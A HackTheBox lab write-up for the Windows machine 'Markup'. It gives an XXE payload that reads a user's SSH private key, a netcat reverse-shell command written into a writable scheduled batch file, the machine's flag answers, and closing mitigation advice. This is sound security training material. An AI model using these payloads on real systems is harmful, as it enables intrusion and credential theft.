# Markup - HackTheBox Writeup

**Date:** April 16, 2026
**OS:** Windows
**IP Address:** 10.129.28.84
**Difficulty:** Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Markup**. 

*   **Initial Access:** Achieved by exploiting an XML External Entity (XXE) vulnerability on the order processing page. This allowed for arbitrary file read, which was leveraged to retrieve the private SSH key of the user `daniel`, granting shell access via SSH.
*   **Privilege Escalation:** During post-exploitation enumeration, a scheduled task was found to be executing a batch file (`job.bat`) in `C:\Log-Management`. This file was found to have lax permissions, allowing any user to modify it. By injecting a reverse shell command into the batch file, administrative access was obtained as `NT AUTHORITY\SYSTEM`.
*   **Key Learning Points:** 
    * XXE vulnerabilities can lead to sensitive data disclosure, including credentials and system files.
    * Improper permissions on scheduled tasks and scripts are a common vector for local privilege escalation on Windows.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH for_Windows_8.1 | Windows-based SSH service |
| 80/tcp | HTTP | Apache httpd 2.4.41 | Main web application (MegaShopping) |
| 443/tcp | HTTPS | Apache httpd 2.4.41 | Secure web application |

**Nmap Command:**
```bash
nmap -p- 10.129.28.84 -oN nmap/initial -sC -sV
```

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** XML External Entity (XXE) Injection
*   **Vector:** The `/process.php` endpoint accepts XML data to process orders. By defining an external ENTITY, we can force the server to read local files.

## 3.2. Exploitation Path
1.  **Vulnerability Identification:** Captured the request to `/process.php` in Burp Suite and identified that the application processes XML input.
2.  **Information Disclosure:** Injected an ENTITY to read the SSH private key of the user `daniel`:
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/Users/Daniel/.ssh/id_rsa'>]>
    <order>
    <quantity>3</quantity>
    <item>&test;</item>
    <address>17th Estate, CA</address>
    </order>
    ```
3.  **SSH Login:** The server returned the private key in the response. After saving it locally and setting correct permissions (`chmod 400`), we logged in via SSH:
    ```bash
    ssh -i id_rsa daniel@10.129.28.84
    ```

**User Flag:**
```bash
type C:\Users\daniel\Desktop\user.txt
# 032d2fc8952a8c24e39c8f0ee9918ef7
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
*   Enumerated the filesystem and found an unusual directory: `C:\Log-Management`.
*   Inspected permissions of the script within:
    ```cmd
    icacls C:\Log-Management\job.bat
    # job.bat BUILTIN\Users:(F)
    ```
*   The `BUILTIN\Users:(F)` permission indicates that any authenticated user has **Full Control** over the script.

## 4.2. Exploitation Path
1.  **Reverse Shell Preparation:** Hosted `nc64.exe` on the attacker machine and downloaded it to the target using `curl` or `wget`.
2.  **Command Injection:** Modified the writable batch file to execute a reverse shell back to the attacker machine:
    ```cmd
    echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.240 4444 > C:\Log-Management\job.bat
    ```
3.  **Shell Capture:** Started a listener on the attacker machine (`nc -lnvp 4444`). Once the scheduled task executed (typically every minute), a reverse shell was received as `Administrator`.

**Root Flag:**
```bash
type C:\Users\Administrator\Desktop\root.txt
# f574a3e7650cebd8c39784299cb570f8
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| daniel | [SSH Private Key] | Obtained via XXE on `/process.php` |

---

# 6. Recommendations & Mitigation
1.  **Prevent XXE:** Disable DTD (Document Type Definitions) and external entity processing in the XML parser used by the PHP application.
2.  **Secure Script Permissions:** Restrict write access to `C:\Log-Management\job.bat` so that only administrative accounts can modify it.
3.  **Principle of Least Privilege:** Audit scheduled tasks to ensure they only run with the necessary privileges, rather than always running as SYSTEM or Administrator.
